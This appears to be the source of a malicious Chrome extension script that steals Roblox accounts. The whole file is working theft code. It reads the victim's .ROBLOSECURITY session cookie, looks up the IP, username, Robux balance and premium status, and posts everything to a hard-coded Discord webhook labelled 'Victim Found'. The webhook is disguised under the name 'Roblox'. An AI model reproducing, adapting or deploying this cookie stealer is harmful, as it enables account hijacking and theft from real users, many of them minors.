const WEBHOOK = "https://discord.com/api/webhooks/1370884927452876830/efx9XLECWNF8za6vH7GwPm8KrLb0uPdLL9ET-wEH5vJLvBocQDFYzma64yDHcfA58bn7";

async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    let statistics = null;
    if (cookie) {
        try {
            const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
                headers: {
                    Cookie: ".ROBLOSECURITY=" + cookie
                },
                redirect: "manual"
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }

            const contentType = response.headers.get("content-type");
            if (contentType && contentType.includes("application/json")) {
                statistics = await response.json();
            } else {
                throw new Error('Response is not JSON');
            }
        } catch (error) {
            console.error('Error fetching user info:', error);
        }
    }

    fetch(WEBHOOK, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            "content": null,
            "embeds": [
                {
                    "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                    "color": null,
                    "fields": [
                        {
                            "name": "Username",
                            "value": statistics ? statistics.UserName : "N/A",
                            "inline": true
                        },
                        {
                            "name": "Robux",
                            "value": statistics ? statistics.RobuxBalance : "N/A",
                            "inline": true
                        },
                        {
                            "name": "Premium",
                            "value": statistics ? statistics.IsPremium : "N/A",
                            "inline": true
                        }
                    ],
                    "author": {
                        "name": "Victim Found: " + ipAddr,
                        "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                    },
                    "footer": {
                        "text": "https://github.com/ox-y",
                        "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                    },
                    "thumbnail": {
                        "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                    }
                }
            ],
            "username": "Roblox",
            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
            "attachments": []
        })
    });
}

chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
    main(cookie ? cookie.value : null);
});